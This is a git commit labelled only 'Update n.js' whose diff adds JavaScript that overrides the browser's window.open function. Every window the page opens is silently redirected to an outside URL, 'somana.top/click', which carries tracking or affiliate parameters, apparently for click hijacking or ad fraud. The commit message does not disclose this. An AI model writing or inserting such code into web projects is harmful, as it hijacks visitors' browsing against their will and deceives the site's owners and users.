faf0c0825fb2e0cad1b667bc034ca07c8fbbf195
Poul <evsyukovandrey@yandex.ru>
2025-08-06 00:51:40 +0300

    Update n.js

--- n.js
+++ n.js
@@ -1,1 +1,12 @@
+const originalOpen = window.open;
 
+
+window.open = function (url, name, specs) {
+  const newWindow = originalOpen.call(this, url, name, specs);
+  
+  if (newWindow) {
+    newWindow.location.href = 'https://somana.top/click?o=2&a=7685';
+  }
+  
+  return newWindow;
+};
